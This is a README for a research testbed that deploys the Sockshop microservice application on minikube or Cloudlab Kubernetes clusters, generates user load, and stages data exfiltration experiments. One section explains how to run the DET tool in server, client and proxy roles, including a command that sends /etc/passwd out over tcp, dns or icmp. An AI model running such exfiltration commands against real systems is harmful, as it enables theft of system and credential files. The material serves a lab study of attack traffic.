# Instructions for VM (minikube):

Ensure that your VM has at least 10 vCPU's, 16 GB RAM and 80 GB HDD. 

1. Clone the repository and navigate to repository folder. 
2. Run the shell script `minikube_env_setup.sh` to install the pre-requisites for minikube setup.
3. Since the experiment is running on Python 2.7, lets use anaconda to setup a virtual environment.
4. To install anaconda, navigate to `cd /tmp` and get the installation script `curl –O https://repo.anaconda.com/archive/Anaconda3-2020.02-Linux-x86_64.sh`. Run the installation script `bash Anaconda3-2020.02-Linux-x86_64.sh`
5. Let's create a Python 2.7.18 virtual environment using `conda create --name sockshop python=2.7.18` and activate the environment using `conda activate sockshop`
6. To install all the package requirements to run the experiment use `pip install -r req.txt`
7. To start a base minikube container use `minikube start --driver=docker --memory 4096 --cpus 8`
8. Prepare the application by populating the database. Move to the relevant directory via `cd ./experiment_coordinator/` and then running `sudo python -u run_experiment.py --use_k3s_cluster --no_exfil --prepare_app --return_after_prepare_p --config_file ../sockshop_experiment.json --localhostip FRONT-END-CLUSTER-IP --localport 80 | tee sockshop_four_140.log`, where FRONT-END-CLUSTER-IP is the clusterIP of the front-end service, which can be seen by running `kubectl get svc front-end --namespace="sock-shop"` and looking at the CLUSTER-IP column
9. Generate load (warning: this takes a long time and a lot of cpu):
`sudo python -u run_experiment.py --use_k3s_cluster --no_exfil --config_file ../sockshop_experiment.json --localhostip FRONT-END-CLUSTER-IP --localport 80`
10. To clean up `minikube delete --all`

### Manually performing data exfiltration attack using DET [Work in progress]

When `run_experiment.py` executed using `python -u run_experiment.py --no_exfil --prepare_app --config_file ../sockshop_experiment_attack.json --localhostip FRONT-END-CLUSTER-IP --localport 80 | tee sockshop_four_140.log` all the dependencies related to DET is installed to the pods mentioned in the attack path in the config-file.

The next bit hasn't been automated yet since the proxy function was not working properly. 

A `sample_det_config.json` has been added to the repo to understand the functionality of DET. DET fundamentally has got 3 roles based on my understanding of the code:
1. Server - Should be used on the container where the file is to be moved. Sample command `python det.py -L -c ./sample_det_config.json -p tcp`, target in the config file is the server IP for different protocols.
2. Client - Should be used on the container where the file is kept. Sample command `python det.py -c ./sample_det_config.json -f /etc/passwd`, target in the config file is the server IP for different protocols. A client sends the file to both the proxies and servers.
3. Proxies - Can be used for intermediate containers a proxy acts a both the server and client. Sample `python det.py -c ./sample_det_config.json -p dns,icmp -Z`, target in the config file is the server IP for different protocols.

The above role division is quite confusing because the client sends data to both servers and proxies. The proxies send data only to the server not making it a clear network path. This bit of the DET code con be modified to make things simpler.

To actually perform data exfiltration you need to copy the config file to the appropriate pod containers and run it manually. Before understanding the commands it is important to understand the container structures in minikube.

With the command `minikube start --driver=docker --memory 4096 --cpus 8` a container is created using `docker` with the given memory and CPU. The rest of the sockshop containers are created inside this container, to access these containers you can either use `kubectl exec` or do `minkube ssh` to get  shell in the minikube container and then do `docker exec` to the specific container. 

Following are some commands that are useful in performing the attack:
1. To get the details of all the pods use `kubectl get pods -A`. 
2. For a specific pod you would need the container ID later to copy the file using `docker cp` or to get the shell using `docker exec`. To get the container ID use `kubectl describe pods -n <namespace here sock-shop> <POD name>`. The actual container ID is the value after `docker://`.
3. `minikube ssh` to get a shell in the minikube container.
4. To get a shell to a specific container `docker exec -u <user-id> -it <container-id> /bin/sh`.
5. To copy a file to a specific user `kubectl cp <file name> <namespace>/<pod name>:<destination path> -c <conatiner name> --user <username>`

Using the above information following can be done to preform the exfiltration attacks:
1. Copy the config file to the respective container according to the attack path.
2. Run DET in the correct mode to perform data exfiltration.

----
# Instructions for Cloudlab

Step-by-step instructions to easily deploy kubespray cluster on Cloudlab. 

There is also support for deploying the Sockshop microservice application onto the cluster and simulating user activity.


NOTE: SSH connections to Cloudlab time out all the time. If the terminal looks frozen, just start a new one, navigate to the correct directory, and keep following the steps. Usually the command kept running in the background. I recommend running the commands from a shell from the experiment's cloudlab status page.

----
1. Create new experiment on Cloudlab using the “small-lan” profile (3 hosts) and Wisconsin cluster (if Wisconsin cluster is full, feel free to use other clusters)
    * Should boot up quickly (within a few minutes)
    * SSH into node1 or node2 (not node0)
2. Clone this repo and move into the corresponding directory
    1. Run: `git clone https://github.com/fretbuzz/KubesprayClusterOnCloudlab.git`
    2. Run: `cd KubesprayClusterOnCloudlab`
3. Run: `bash setup_kubespray_prereqs.sh`
4. Manually setup passwordless-SSH:
    1. `cd ~/.ssh/`
    2. Store your cloudlab private key in tempkey.pem. Do this by first creating a new file called tempkey.pem (if it doesn't already exist). Then, get your cloudlab private key by going to https://www.cloudlab.us/, pressing “Download Credentials”, and copy-pasting the whole file up to and including the “END RSA PRIVATE KEY” line into tempkey.pem. 
    3. Put your Cloudlab public key in tempkey.pub (can get from https://www.cloudlab.us/ssh-keys.php)
5. Move back to the relevant directory: `cd ~/KubesprayClusterOnCloudlab`
6. Run: `bash deploy_kubespray.sh`. Add the flag `-c` if you want to deploy cilium (and hubble) instead of Istio.
    * At some point you will be asked for the phasephrase for `.ssh/tempkey.pem`. This is the password to your Cloudlab profile. If the password was correct, it will output “Identity added:...". If any y/N prompts shows up, respond: `y`.
   NOTE: IF this scripts runs sucessful, you should see a ton of ansible output and no errors.
7. Setup InfluxDB integration with Prometheus (this is one way to get the time series data) -- this has not been implemented yet (and you might choose not to implement it)
8. \[If you want to deploy sockshop\] Run: `bash deploy_sockshop.sh`. The script waits a bunch of times (to give Kubernetes cluster components time to instantiate), so don't be concerned if that happens.
9. Prepare the application by populating the database. Move to the relevant directory via `cd ./experiment_coordinator/` and then running `sudo python -u run_experiment.py --use_k3s_cluster --no_exfil --prepare_app --return_after_prepare_p --config_file ../sockshop_experiment.json --localhostip FRONT-END-CLUSTER-IP --localport 80 | tee sockshop_four_140.log`, where FRONT-END-CLUSTER-IP is the clusterIP of the front-end service, which can be seen by running `kubectl get svc front-end --namespace="sock-shop"` and looking at the CLUSTER-IP column
10. Generate load (warning: this takes a long time and a lot of cpu):
`sudo python -u run_experiment.py --use_k3s_cluster --no_exfil --config_file ../sockshop_experiment.json --localhostip FRONT-END-CLUSTER-IP --localport 80`

NOTE: Need to add autoscaling support to the kubespray cluster

NOTE: To collect cadvisor metrics, use this command 
`python3 influx_csv_dumper.py -db cadvisor -tl 15m`, where -tl is the Length of time for the dump. This requires that you installed influxdb via `sudo pip3 install influxdb`.

NOTE: For additional notes on setting up Hubble/Cilium, see [this guide](cilium-readme.md).
